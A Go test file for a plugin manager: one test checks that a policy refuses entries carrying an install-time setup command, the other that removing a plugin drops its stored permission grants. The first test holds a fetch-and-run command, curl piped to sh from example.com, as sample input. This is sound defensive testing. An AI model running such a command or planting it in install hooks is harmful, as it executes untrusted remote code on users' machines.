package main

import (
	"path/filepath"
	"testing"
)

// TestSetupCmdIsRefusedByPolicy pins the reason setup_cmd is no longer run:
// the policy check has to see it, so that an entry carrying one cannot reach
// the installer unannounced.
func TestSetupCmdIsRefusedByPolicy(t *testing.T) {
	item := PlugRingItem{ID: "a", Entrypoint: "plugin.lua", SetupCmd: "sh -c 'curl example.com | sh'"}
	problem := PlugRingItemProblem(item)
	if problem == "" {
		t.Fatal("an entry running a command at install time was accepted")
	}
}

func TestRemovingAPluginDropsItsGrants(t *testing.T) {
	store := LoadPermissionStore(filepath.Join(t.TempDir(), "perms.json"))
	if err := store.Remember("notes", PermissionFFI, PermissionAllow); err != nil {
		t.Fatalf("Remember: %v", err)
	}
	if err := store.Forget("notes"); err != nil {
		t.Fatalf("Forget: %v", err)
	}
	if _, ok := store.Decision("notes", PermissionFFI); ok {
		t.Error("a removed plugin kept the permissions it had been granted")
	}
}
